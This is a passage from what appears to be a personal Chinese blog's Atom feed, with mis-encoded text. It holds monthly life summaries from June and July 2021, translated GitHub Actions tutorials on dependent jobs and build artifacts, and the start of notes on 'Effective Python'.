    <content type="html"><![CDATA[<h3><span id="qi-yue-fa-sheng-liao-shi-me-shi-qing">ä¸ƒæœˆå‘ç”Ÿäº†ä»€ä¹ˆäº‹æƒ…</span></h3><ol><li>æ¢å¤æ–­æ›´ä¸€å¹´çš„ã€Š<a href="https://pyweekly.qiwihui.com/">Python å‘¨æŠ¥ï¼ˆPython weeklyï¼‰</a>ã€‹å’Œå¯¹åº”çš„å…¬ä¼—å·ï¼›</li><li>å’¨è¯¢çŒ«è¡Œä¸ºä¸“å®¶ï¼Œå¾ˆå¤§ç¨‹åº¦è§£å†³çŒ«çŒ«æ™šä¸Šé—¹äººå’Œå–‚é£Ÿçš„é—®é¢˜ï¼›</li><li>å¼€å§‹å­¦ä¹ è›™æ³³ï¼›</li><li>ä¸Šçº¿äº†ä¸€ä¸ª macOS APPï¼š<a href="https://egges.qiwihui.com/">Egges</a>ï¼Œä¸€ä¸ª macOS å¹³å°ä¸Šçš„ Elasticsearch é›†ç¾¤ç®¡ç†ç”¨å…·ã€‚</li></ol><h3><span id="qi-yue-du-shu">ä¸ƒæœˆè¯»ä¹¦</span></h3><p>ã€Šçˆ±æ˜¯ä¸€ç§é€‰æ‹©ã€‹å’Œã€Šéæš´åŠ›æ²Ÿé€šã€‹éƒ½æ²¡æœ‰è¯»å®Œ</p><h3><span id="qi-yue-chuang-zuo">ä¸ƒæœˆåˆ›ä½œ</span></h3><ol><li>æ›´æ–°äº† <a href="https://www.youtube.com/channel/UCNrMyfwfsQ98FQWcUKDiZIw">two catsâ€™ diary</a> 3æ”¯å½±ç‰‡ï¼›</li><li>ä¸€ç¯‡ã€ŠDDIAã€‹è¯»ä¹¦ç¬”è®°ï¼š<a href="https://github.com/qiwihui/blog/issues/143">ç¬¬ä¸€ç« ï¼šå¯é æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯ç»´æŠ¤æ€§</a></li></ol><h3><span id="qi-yue-guan-ying">ä¸ƒæœˆè§‚å½±</span></h3><ul><li>ã€Š<a href="https://movie.douban.com/subject/35332568/">å¥‡å·§è®¡ç¨‹è½¦ ODD TAXI (2021)</a>ã€‹</li><li>ã€Š<a href="https://movie.douban.com/subject/30331432/">Loki</a>ã€‹</li><li>ã€Šé»‘å¯¡å¦‡ã€‹</li><li>ã€Š<a href="https://m.douban.com/movie/subject/27622447/">å°å·å®¶æ—</a>ã€‹</li><li>ã€Š<a href="https://movie.douban.com/subject/34874432/">èŠ±æŸèˆ¬çš„æ‹çˆ±</a>ã€‹</li><li>ã€Š<a href="https://movie.douban.com/subject/34908206//">Rick and Mortyï¼ˆç¬¬äº”å­£ï¼‰</a>ã€‹</li></ul><h3><span id="ba-yue-ju-jiao-de-shi-qing">å…«æœˆèšç„¦çš„äº‹æƒ…</span></h3><ol start="0"><li>å®Œæˆä¸€æ¬¡äº”å…¬é‡Œï¼Œå®Œæˆäº”å…¬é‡Œ30åˆ†é’Ÿï¼›</li><li>å­¦ä¼šè›™æ³³ï¼›</li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä¸ƒæœˆå°ç»“ï¼ˆ2021.07ï¼‰
    
    </summary>
    
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>å…­æœˆå°ç»“ï¼ˆ2021.06ï¼‰</title>
    <link href="https://qiwihui.com/qiwihui-blog-144/"/>
    <id>https://qiwihui.com/qiwihui-blog-144/</id>
    <published>2021-02-08T09:36:54.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å…­æœˆå‘ç”Ÿçš„äº‹æƒ…</p><h3><span id="liu-yue-fa-sheng-liao-shi-me-shi-qing">å…­æœˆå‘ç”Ÿäº†ä»€ä¹ˆäº‹æƒ…</span></h3><ol><li>å…»æˆäº†æ—©ä¸Šå…­ç‚¹åŠæ—©èµ·è·‘æ­¥é”»ç‚¼çš„ä¹ æƒ¯ï¼›</li><li>å› ä¸ºæˆ‘å¯¹å®¶é‡Œäººçš„æ‹–ç´¯ç—‡ï¼Œå’Œå¤ªå¤ªä¹‹é—´çš„äº‰åµæ¶ˆè€—äº†å¾ˆå¤šå…ƒæ°”ï¼Œç®—ç„¶æˆé•¿äº†ï¼Œä½†å¯¹å¥¹å¯¹æˆ‘æ¥è¯´å´å¾ˆç´¯ï¼›</li><li>å‘è€æ¿æå‡ºäº†æ¶¨å·¥èµ„è¦æ±‚ï¼Œå¹¶é¡ºåˆ©å®Œæˆï¼›</li><li>æ‹œè®¿äº†æœ‹å‹çš„æ–°å®¶ï¼Œå¾ˆå¼€å¿ƒã€‚</li></ol><h3><span id="liu-yue-guan-ying">å…­æœˆè§‚å½±</span></h3><p>æ—¥å‰§å’Œç”µå½±çœ‹å¾—å¤šä¸€äº›å•Šã€‚</p><ul><li>ã€Šæµªå®¢å‰‘å¿ƒã€‹ã€ã€Šæµªå®¢å‰‘å¿ƒï¼šäº¬éƒ½å¤§ç«ç¯‡ã€‹ã€ã€Šæµªå®¢å‰‘å¿ƒï¼šä¼ è¯´çš„å®Œç»“ç¯‡ã€‹</li><li>ã€Šç¬¬åä¸€å›ã€‹</li><li>:+1:ã€ŠçŸ­å‰§å¼€å§‹å•¦ã€‹</li><li>ã€Šå…¨è£¸å¯¼æ¼”2ã€‹</li></ul><h3><span id="liu-yue-du-shu">å…­æœˆè¯»ä¹¦</span></h3><p>å…­æœˆå¼€å§‹æ¶‰åŠä¸€äº›å¿ƒç†å­¦çš„ä¹¦ç±ï¼Œä½†æ˜¯éƒ½åœ¨è¯»ã€‚</p><h3><span id="liu-yue-chuang-zuo">å…­æœˆåˆ›ä½œ</span></h3><ul><li>å¼€é€šäº†Youtubeé¢‘é“ã€ŠTwo cats diaryã€‹ï¼Œç”¨æ¥è®°å½•ä¸¤åªçŒ«çŒ«çš„æ—¥å¸¸ç”Ÿæ´»ï¼Œå‘å¸ƒå½±ç‰‡3æ”¯ï¼›</li><li>æ²¡æœ‰åšå®¢æ›´æ–°å’Œå…¶ä»–æ›´æ–°ã€‚</li></ul><h3><span id="qi-yue-ju-jiao-de-shi-qing">ä¸ƒæœˆèšç„¦çš„äº‹æƒ…</span></h3><p><strong>1. æ—©èµ·å’Œé”»ç‚¼</strong>äº‰å–èƒ½åœ¨å…­ç‚¹é’Ÿèµ·åºŠï¼ŒåšåŠå°æ—¶è‡ªå·±å–œæ¬¢çš„ï¼Œæœ‰æœªæ¥æ„ä¹‰çš„äº‹æƒ…ï¼Œç„¶åå‡ºé—¨è·‘æ­¥é”»ç‚¼ï¼›</p><p><strong>2. å¿ƒç†å’¨è¯¢</strong>ç»§ç»­å’Œå’¨è¯¢å¸ˆæ¢è®¨è‡ªå·±å®¶åº­ç»™è‡ªå·±å¸¦æ¥çš„å›°æ‰°ï¼›</p><p><strong>3. å‡†å¤‡é›…æ€è€ƒè¯•</strong>å®Œå…¨å®šä¸‹é›…æ€è€ƒè¯•æ—¶é—´ï¼Œå¤ä¹ è§„åˆ’ï¼›</p><p><strong>4. å·¥ä½œæŠ€èƒ½</strong></p><ul><li>æ•°æ®ç»“æ„å’Œç®—æ³•ï¼›</li><li>ç³»ç»Ÿè®¾è®¡å’Œåˆ†å¸ƒå¼ç†è®ºï¼›</li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å…­æœˆå°ç»“ï¼ˆ2021.06ï¼‰
    
    </summary>
    
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬19å¤©ï¼šä¸‹è½½æ–‡ä»¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-102/"/>
    <id>https://qiwihui.com/qiwihui-blog-102/</id>
    <published>2020-11-04T08:10:57.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©ï¼Œæˆ‘ä»¬ç ”ç©¶äº†å¦‚ä½•åœ¨å·¥ä½œæµè¿è¡Œè¿‡ç¨‹ä¸­<a href="https://qiwihui.com/qiwihui-blog-101/">ä¸Šä¼ æ–‡ä»¶</a>ï¼Œç„¶åæ‰‹åŠ¨ä¸‹è½½å®ƒä»¬ã€‚è¿™åœ¨è®¸å¤šæƒ…å†µä¸‹éƒ½éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºä½¿ç”¨æ–‡ä»¶çš„æ›´å¼ºå¤§çš„éƒ¨åˆ†æ˜¯ä½¿ç”¨å·¥ä»¶åœ¨ä¸åŒæ­¥éª¤ä¹‹é—´ä¼ è¾“æ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼šä½ å¯èƒ½æœ‰ä¸€ä¸ªé¡¹ç›®ï¼Œè¯¥é¡¹ç›®åœ¨å¤šä¸ªå¹³å°ä¸Šåˆ›å»ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šè½½ï¼Œç„¶åå‘å¸ƒåˆ°æœ€åè¿è¡Œä½œä¸šä»¥å°†è¿™äº›ä¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶èšåˆåˆ°ä¸€ä¸ªç¨‹åºåŒ…ä¸­ã€‚</p><p>æˆ–è€…ï¼Œä½ å¯èƒ½æƒ³æ•£å¼€â”€â”€æ‹¥æœ‰ä¸€ä¸ªåˆ›å»ºå•ä¸ªæ–‡ä»¶çš„ä½œä¸šï¼Œç„¶ååœ¨ä¸åŒå¹³å°ä¸Šè¿è¡Œå¤šä¸ªä½œä¸šä»¥æµ‹è¯•è¯¥æ–‡ä»¶ã€‚</p><span id="more"></span><p>åœ¨è¿™é‡Œï¼Œæˆ‘æœ‰ä¸€ä¸ªæµ‹è¯•æˆ‘çš„æœ¬æœºä»£ç çš„å·¥ä½œæµç¨‹ï¼šé¦–å…ˆï¼Œæˆ‘æ„å»ºæœ¬æœºä»£ç æµ‹è¯•è¿è¡Œå™¨ï¼Œè¯¥è¿è¡Œå™¨ä½¿ç”¨ <a href="https://github.com/clar-test/clar">clar</a> å•å…ƒæµ‹è¯•æ¡†æ¶ï¼Œä»¥ä¾¿å®ƒç¼–è¯‘ä¸€ä¸ªä»¥ <code>testapp</code> å‘½åçš„åŒ…å«æˆ‘æ‰€æœ‰å•å…ƒæµ‹è¯•çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä½œä¸ºåä¸ºçš„æ–‡ä»¶ä¸Šä¼  <code>tests</code>ã€‚ç„¶åï¼Œæˆ‘å°†åˆ›å»ºä¸€ä¸ªä¾èµ–äºç¬¬ä¸€ä¸ª<code>build</code> ä½œä¸šçš„çŸ©é˜µä½œä¸šã€‚å®ƒå°†ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„Ubuntuï¼ŒDebianï¼ŒCentOSå’ŒAlpineå»ºç«‹ä¸€ä¸ªåœ¨å®¹å™¨å†…æ‰§è¡Œçš„çŸ©é˜µã€‚æ¯ä¸ªä½œä¸šå°†ä¸‹è½½ <code>tests</code> æ„å»ºä½œä¸šä¸­ç”Ÿæˆçš„æ–‡ä»¶ï¼Œç„¶åå°†è®¾ç½® testapp ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå› ä¸ºæ–‡ä»¶ä¸ä¿ç•™Unixæƒé™ï¼‰ï¼Œæœ€åè¿è¡Œæµ‹è¯•åº”ç”¨ç¨‹åºã€‚</p><script src="https://gist.github.com/ethomson/9add864c916083aaf0c0d3b0bd092351.js"></script><p>å½“æˆ‘è¿è¡Œå®ƒæ—¶ï¼Œæ„å»ºå°†äº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å½“è¯¥æ„å»ºå®Œæˆæ—¶ï¼Œæˆ‘çš„æµ‹è¯•ä½œä¸šå°†å…¨éƒ¨å¼€å§‹ï¼Œä¸‹è½½è¯¥æ–‡ä»¶ï¼Œç„¶åè¿è¡Œå®ƒã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/79038436-d64bd580-7c0b-11ea-8984-e28ba788f465.png" alt="image"></p><p>ä½ å¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¼ æ–‡ä»¶å¯¹äºç”Ÿæˆæ„å»ºè¾“å‡ºéå¸¸æœ‰ç”¨ï¼Œä½ å¯ä»¥åœ¨åç»­æ„å»ºæ­¥éª¤ä¸­ä¸‹è½½å’Œä½¿ç”¨è¿™äº›è¾“å‡ºã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_19_downloading_artifacts.html">https://www.edwardthomson.com/blog/github_actions_19_downloading_artifacts.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬19å¤©ï¼šä¸‹è½½æ–‡ä»¶
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬18å¤©ï¼šæ–‡ä»¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-101/"/>
    <id>https://qiwihui.com/qiwihui-blog-101/</id>
    <published>2020-11-04T07:34:08.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å½“ä½ æ„å»ºæ‰§è¡Œpull requestéªŒè¯æˆ–æŒç»­é›†æˆæ„å»ºçš„å·¥ä½œæµæ—¶ï¼Œä½ é€šå¸¸å¸Œæœ›è·å–è¯¥æ„å»ºè¾“å‡ºå¹¶ä¿å­˜å®ƒï¼Œä»¥ä¾¿ä»¥åä½¿ç”¨ã€‚æœ‰æ—¶åˆ›å»ºä¸€ä¸ªè½¯ä»¶åŒ…å¹¶å°†å…¶å‘å¸ƒåˆ°<a href="https://qiwihui.com/qiwihui-blog-92/">GitHub packages</a>ä¹‹ç±»çš„è½¯ä»¶åŒ…ä»“åº“ä¸­æ˜¯æœ‰æ„ä¹‰çš„ ã€‚ä½†æ˜¯æœ‰æ—¶ä½ åªæƒ³å°†å…¶å­˜å‚¨ä¸ºæ„å»ºè¾“å‡ºçš„ä¸€éƒ¨åˆ†ï¼Œä»¥åå¯ä»¥ä¸‹è½½ã€‚GitHub Actionså…è®¸ä½ å°†æ–‡ä»¶ä¸Šä¼ ä¸ºå·¥ä½œæµçš„ä¸€éƒ¨åˆ†ï¼Œä»¥ä¾›æ—¥åä¸‹è½½ã€‚</p><p>è¦å°†æ–‡ä»¶ä½œä¸ºæ„å»ºçš„ä¸€éƒ¨åˆ†è¿›è¡Œä¸Šä¼ ï¼Œå¯ä»¥ä½¿ç”¨ <a href="https://github.com/actions/upload-artifact"><code>upload-artifact</code></a> æ“ä½œã€‚ä½ å¯ä»¥æŒ‡å®šä¸ºå…¶åˆ›å»ºæ–‡ä»¶çš„è·¯å¾„â€“ä½ å¯ä»¥æŒ‡å®šå•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œä»¥åŠæ–‡ä»¶çš„åç§°ã€‚ä½ æŒ‡å®šçš„è·¯å¾„å°†ä»¥ä½ æŒ‡å®šçš„å·¥ä»¶åç§°å­˜æ¡£åˆ°ä¸€ä¸ªzipæ–‡ä»¶ä¸­ã€‚</p><span id="more"></span><p>ä¾‹å¦‚ï¼Œæˆ‘å¯ä»¥æ„å»ºå’Œæµ‹è¯•æˆ‘çš„é¡¹ç›®ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªnugetåŒ…ï¼Œæœ€åå°†è¯¥nugetåŒ…ä½œä¸ºæ–‡ä»¶ä¸Šä¼ ã€‚</p><script src="https://gist.github.com/ethomson/5101813150c57362ee072ee696d60be7.js"></script><p>ç°åœ¨ï¼Œå½“æˆ‘çš„å·¥ä½œæµç¨‹è¿è¡Œæ—¶ï¼Œæˆ‘å°†åœ¨è¯¥è¿è¡Œçš„å³ä¸Šè§’è·å¾—ä¸€ä¸ªé€‰é¡¹ï¼Œå‘æˆ‘å±•ç¤ºæˆ‘çš„æ–‡ä»¶å¹¶è®©æˆ‘ä¸‹è½½å®ƒä»¬ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/79037750-64bd5880-7c06-11ea-8267-76a83bafe0ea.png" alt="image"></p><p>å°†æ„å»ºè¾“å‡ºä½œä¸ºæ–‡ä»¶ä¸Šè½½å¯ä»¥ä¸åŒ…ä»“åº“ä¸€èµ·ä½¿ç”¨ï¼šæˆ‘å–œæ¬¢å°†CIæ„å»ºåŒ…ä¸Šè½½åˆ°GitHub packagesï¼Œå¹¶ä»pull requestä¸­åˆ›å»ºå·¥ä»¶ã€‚è¿™ä½¿æˆ‘å¯ä»¥é€‰æ‹©åœ¨æœ¬åœ°è¿è¡Œå’Œæµ‹è¯•PRéªŒè¯æ„å»ºâ”€â”€æˆ‘å¯ä»¥å°†å®ƒä»¬ä½œä¸ºæ–‡ä»¶ä¸‹è½½â”€â”€è€Œä¸ä¼šå½±å“æˆ‘çš„GitHub Packageså¸æˆ·ã€‚å¦‚æœä½ å¸Œæœ›é€‰æ‹©åœ¨æœ¬åœ°è¿è¡Œï¼Œé‚£å¾ˆå¥½ï¼Œå³ä½¿ä½ å¾ˆå°‘è¿™æ ·åšã€‚</p><p>åŸæ–‡è¿æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_18_artifacts.html">https://www.edwardthomson.com/blog/github_actions_18_artifacts.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬18å¤©ï¼šæ–‡ä»¶
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬17å¤©ï¼šä¾èµ–ä½œä¸š</title>
    <link href="https://qiwihui.com/qiwihui-blog-100/"/>
    <id>https://qiwihui.com/qiwihui-blog-100/</id>
    <published>2020-11-04T07:02:59.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœä½ è®¾ç½®äº†åŒ…å«å¤šä¸ªä½œä¸šçš„å·¥ä½œæµç¨‹ï¼ˆæ— è®ºæ˜¯<a href="https://qiwihui.com/qiwihui-blog-85/">åŸºäºçŸ©é˜µçš„å·¥ä½œæµç¨‹</a>è¿˜æ˜¯åªæ˜¯å•ç‹¬å®šä¹‰äº†ä½œä¸šï¼‰ï¼Œè¿™äº›ä½œä¸šå°†å½¼æ­¤ç‹¬ç«‹åœ°å¹¶è¡Œè¿è¡Œã€‚é€šå¸¸ï¼Œè¿™æ˜¯ç†æƒ³çš„ã€‚åªè¦æœ‰å¯ç”¨çš„è®¡ç®—æœºå³å¯æ‰§è¡Œä½ çš„ä½œä¸šã€‚</p><p>ä½†æ˜¯æœ‰æ—¶ä½ å¸Œæœ›èƒ½å¤Ÿè®¾ç½®ä¾èµ–äºå…¶ä»–ä½œä¸šçš„ä½œä¸šã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½æœ‰ä¸€äº›è¦æµ‹è¯•çš„æœåŠ¡ã€‚ä½†æ˜¯ä¸ºäº†èŠ‚çœæˆæœ¬ï¼Œä½ åªæƒ³åœ¨å®é™…è¿è¡Œæµ‹è¯•æ—¶è¿è¡Œé‚£äº›æœåŠ¡ã€‚å› æ­¤ï¼Œä½ å¯èƒ½æƒ³è¦ä¸€ä¸ªå¯åŠ¨æœåŠ¡çš„ä½œä¸šï¼Œä¸€ä¸ªè¿è¡Œæµ‹è¯•çš„å·¥ä½œä¸šï¼Œç„¶åæ˜¯ä¸€ä¸ªåœæ­¢æœåŠ¡çš„ä½œä¸šã€‚</p><p>è¦æŒ‡å®šä½œä¸šä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå¯ä»¥ä½¿ç”¨ <code>needs</code> å…³é”®å­—æŒ‡ç¤ºå“ªäº›ä½œä¸šä¾èµ–äºå…¶ä»–ä½œä¸šçš„å®Œæˆã€‚</p><span id="more"></span><script src="https://gist.github.com/ethomson/1b52ca3b472b10a16972414f96c474fb.js"></script><p>ç°åœ¨ï¼Œè¿™ä¼¼ä¹ä¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­â€“æˆ‘ä»¬å¯èƒ½ä¸ä½¿ç”¨å•ç‹¬çš„ä½œä¸šï¼Œè€Œå¯èƒ½åªåœ¨ä¸€ä¸ªä½œä¸šä¸­å®Œæˆäº†è¿™ä¸‰ä¸ªæ­¥éª¤ã€‚ä½†æ˜¯ä½¿ç”¨ä½œä¸šå¯ä»¥ä½¿æˆ‘ä»¬â€œæˆé•¿â€ï¼šå®é™…ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªä½œä¸šä¸­è®¾ç½®æµ‹è¯•åŸºç¡€ç»“æ„ï¼Œç„¶åå¹¶è¡Œè¿è¡Œå¤šä¸ªä½œä¸šä»¥å¯¹å…¶è¿›è¡Œæµ‹è¯•ï¼Œç„¶åæœ€åè¿è¡Œæ¸…ç†ä½œä¸šã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/79037364-c380d300-7c02-11ea-9bcb-682b6f1bd2b1.png" alt="image"></p><p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å¤šä¸ªå¹³å°ä¸Šå¹¶è¡Œè¿è¡Œæµ‹è¯•ä½œä¸šï¼Œå¹¶é€šè¿‡è®¾ç½®å°†è¿™äº›ä½œä¸šé¢„å®šä¸‹æ¥ï¼Œç„¶ååœæ­¢ä½œä¸šã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å®šä¹‰æˆ‘ä»¬çš„å®‰è£…ä½œä¸šï¼Œç„¶åå®šä¹‰ä¾èµ–äºå®ƒçš„è®¸å¤šä½œä¸šï¼Œç„¶åä¾èµ–äºè¿™äº›ä½œä¸šçš„æœ€ç»ˆçš„å·¥ä½œã€‚è¿™é€šå¸¸ç§°ä¸ºâ€œæ‰‡å‡ºâ€å’Œâ€œæ‰‡å…¥â€ã€‚</p><script src="https://gist.github.com/ethomson/11febc97d2b41187f5cbb8ddaf9bfdce.js"></script><p>é€šè¿‡æ­¤å·¥ä½œæµç¨‹ï¼Œæˆ‘ä»¬çš„è®¾ç½®ä½œä¸šå°†è¿è¡Œï¼Œç„¶åå°†ä½¿ç”¨çŸ©é˜µåœ¨Windowsï¼ŒmacOSå’ŒLinuxä¸Šè¿è¡Œæ„å»ºå’Œæµ‹è¯•ä½œä¸šï¼Œæœ€åï¼Œæˆ‘ä»¬å°†å…³é—­å¯åŠ¨çš„é‚£äº›æµ‹è¯•èµ„æºã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/79037374-e3b09200-7c02-11ea-8618-5026cfdd9b63.png" alt="image"></p><p>ä½ å¯ä»¥é€šè¿‡ç›¸äº’æŒ‡å®šä½œä¸šæ¥è½»æ¾åœ°æ„å»ºé«˜çº§å·¥ä½œæµï¼Œ <code>needs</code> ä»¥æŒ‡å®šå·¥ä½œæµçš„ä¾èµ–å…³ç³»å›¾ã€‚</p><p>åŸæ–‡è¿æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_17_dependent_jobs.html">https://www.edwardthomson.com/blog/github_actions_17_dependent_jobs.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬17å¤©ï¼šä¾èµ–ä½œä¸š
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šç¼–å†™é«˜è´¨é‡Pythonä»£ç çš„59ä¸ªæœ‰æ•ˆæ–¹æ³•ã€‹ç¬”è®°</title>
    <link href="https://qiwihui.com/qiwihui-blog-79/"/>
    <id>https://qiwihui.com/qiwihui-blog-79/</id>
    <published>2020-09-01T03:42:26.000Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1-python-ban-ben">1. Pythonç‰ˆæœ¬</span></h3><ul><li>Python 3</li><li>CPython, PyPy, Jython, IronPython</li></ul><h3><span id="2-pep8">2. PEP8</span></h3><p>ä»£ç é£æ ¼ä¸€è‡´</p><h3><span id="3-bytes-str-unicode-zhi-tao-lun-python-3">3. bytesï¼Œstrï¼Œunicodeï¼ˆåªè®¨è®ºPython 3ï¼‰</span></h3><p>Python 3ä¸­ï¼šbyteså®ä¾‹åŒ…å«åŸå§‹çš„8ä½å€¼ï¼Œstrå®ä¾‹åŒ…å«Unicodeå­—ç¬¦ã€‚æŠŠUnicodeå­—ç¬¦è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œæœ€å¸¸è§çš„ç¼–ç æ–¹å¼æ˜¯UTF-8ã€‚</p><ul><li>Unicode å­—ç¬¦ =&gt; äºŒè¿›åˆ¶ï¼š<code>encode</code></li><li>äºŒè¿›åˆ¶ =&gt; Unicode å­—ç¬¦ï¼š<code>decode</code></li></ul><span id="more"></span><p>Pythonç¨‹åºä¸­ï¼Œä¸€å®šè¦æŠŠç¼–ç å’Œè§£ç æ”¾åœ¨æœ€å¤–å›´æ¥æ“ä½œã€‚ç¨‹åºçš„æ ¸å¿ƒéƒ¨åˆ†åº”è¯¥ä½¿ç”¨Unicodeå­—ç¬¦ç±»å‹ï¼Œè€Œä¸”ä¸è¦å¯¹å­—ç¬¦ç¼–ç åšä»»ä½•å‡è®¾ã€‚</p><p>å®šä¹‰ <code>to_str</code> å’Œ <code>to_bytes</code> æ–¹æ³•ã€‚</p><p>Python 3ä¸­ï¼Œ<code>open</code>é»˜è®¤ä»¥<code>utf-8</code>ç¼–ç æ‰“å¼€ï¼Œè€Œä¸æ˜¯äºŒè¿›åˆ¶ã€‚</p><h3><span id="4-yong-fu-zhu-han-shu-lai-qu-dai-fu-za-biao-da-shi">4. ç”¨è¾…åŠ©å‡½æ•°æ¥å–ä»£å¤æ‚è¡¨è¾¾å¼</span></h3><h3><span id="5-xu-lie-qie-pian">5. åºåˆ—åˆ‡ç‰‡</span></h3><ol><li><code>list</code>ï¼Œ<code>str</code>ï¼Œ<code>bytes</code> ä»¥åŠå®ç°äº† <code>__getitem__</code> å’Œ <code>__setitem__</code>  çš„ç±»ï¼›</li><li>åˆ‡ç‰‡æ—¶ä¸‹è¡¨å¯ä»¥è¶Šç•Œï¼Œä½†è®¿é—®å…ƒç´ æ—¶ä¸èƒ½ï¼›</li><li>å½“startç´¢å¼•ä¸º0æˆ–è€…endç´¢å¼•ä¸ºåˆ—åºåˆ—é•¿åº¦æ—¶ï¼Œåº”è¯¥å°†å…¶çœç•¥ï¼›</li><li>å¯¹listèµ‹å€¼æ—¶ï¼Œä½¿ç”¨åˆ‡ç‰‡ä¼šæŠŠåŸåºåˆ—ç›¸å…³èŒƒå›´çš„å€¼æ›¿æ¢æˆæ–°å€¼ï¼Œå³ä½¿é•¿åº¦ä¸ä¸€æ ·ï¼›</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a = [1,2,3,4,5,6,7]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a[1:6] = [9]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a</span></span><br><span 